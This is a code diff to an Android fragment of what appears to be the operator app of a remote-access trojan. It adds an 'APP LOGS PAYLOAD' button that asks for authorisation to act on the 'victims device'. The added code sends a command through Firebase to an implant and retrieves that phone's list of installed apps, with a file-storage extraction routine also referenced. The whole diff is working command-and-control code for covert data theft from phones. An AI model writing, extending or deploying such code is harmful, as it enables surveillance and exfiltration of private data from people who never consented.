@@ -895,7 +895,7 @@ public class HomeContent extends Fragment {
         });
 
         view.findViewById(R.id.deviceInfo).setOnClickListener(b -> {
-
+            Toast.makeText(getContext(), "Currently un available", Toast.LENGTH_SHORT).show();
         });
 
         view.findViewById(R.id.loc).setOnClickListener(k -> {
@@ -1056,7 +1056,96 @@ public class HomeContent extends Fragment {
                         })
                         .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show());
 
+        view.findViewById(R.id.installedApplications).setOnClickListener(y -> {
+            new AlertDialog.Builder(getContext())
+                    .setTitle("Execution Authorization")
+                    .setMessage(Html.fromHtml("<br>Are you sure you want to execute the APP LOGS PAYLOAD on victims device ??<br><br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a JSON file and will be sent back to you.</li><ul>"))
+                    .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
+                        startAppLogExtraction();
+                    })
+                    .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();
+        });
+
         return view;
+    }
+
+    private void startAppLogExtraction() {
+        final int[] c = {0};
+        alertDialog = new AlertDialog.Builder(getActivity())
+                .setMessage("Waiting for payload response... please do not close this window.")
+                .create();
+        alertDialog.show();
+        PayloadConnection
+                .initializePayloadConnection()
+                .checkPayloadConnection(new PayloadConnectionListner() {
+                    @Override
+                    public void onConnectionSuccessful() {
+                        t1.speak("Connection Established, Executing payload now", TextToSpeech.QUEUE_FLUSH, null);
+                        alertDialog.dismiss();
+                        AlertDialog alertDialog = new AlertDialog.Builder(getContext())
+                                .setCancelable(false)
+                                .setPositiveButton("STOP", (o, l) -> {
+                                })
+                                .setTitle("Extraction of Installed apps details")
+                                .setMessage("\nChecking payload.... DONE")
+                                .show();
+                        TextView messageView = alertDialog.findViewById(android.R.id.message);
+                        FirebaseDatabase
+                                .getInstance()
+                                .getReference("command")
+                                .setValue(20)
+                                .addOnCompleteListener(p -> {
+                                    if (p.isSuccessful()) {
+                                        messageView.setText(messageView.getText().toString().concat("\nSending command to the payload.... DONE\nCounting Files... DONE\nCompressing and uploading... PROGRESS"));
+                                        FirebaseDatabase
+                                                .getInstance()
+                                                .getReference("LIVE")
+                                                .child("installed_apps")
+                                                .addValueEventListener(new ValueEventListener() {
+                                                    @Override
+                                                    public void onDataChange(@NonNull DataSnapshot snapshot) {
+                                                        if (snapshot.exists()) {
+                                                            //TODO UPDATE SQL
+                                                            if (c[0] == 1) {
+
+                                                                FirebaseDatabase.getInstance().getReference("command").setValue(99);
+                                                                messageView.setText(messageView.getText().toString().concat("\nReceived data from the payload.... DONE\nDisplaying data."));
+                                                                alertDialog.dismiss();
+                                                                Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(snapshot.getValue(String.class)));
+                                                                startActivity(browserIntent);
+                                                                //startActivity(new Intent(getContext(), ContactsDisplay.class).putExtra("uri",snapshot.getValue(String.class)));
+                                                                snapshot.getRef().removeEventListener(this);
+                                                            }
+                                                            c[0]++;
+
+                                                        }
+                                                    }
+
+                                                    @Override
+                                                    public void onCancelled(@NonNull DatabaseError error) {
+
+                                                    }
+                                                });
+
+                                    } else {
+                                        t1.speak("Data extraction failed..", TextToSpeech.QUEUE_FLUSH, null);
+
+                                    }
+                                });
+
+
+                    }
+
+                    @Override
+                    public void onPayloadError(String message) {
+                        t1.speak("Failed to connect to the server.", TextToSpeech.QUEUE_FLUSH, null);
+
+                        Snackbar.make(getView(), "Failed to connect to the server.", Snackbar.LENGTH_LONG)
+                                .setAction("DISMISS", v -> {
+                                }).show();
+
+                    }
+                });
     }
 
     private void startFileStorageExtraction() {
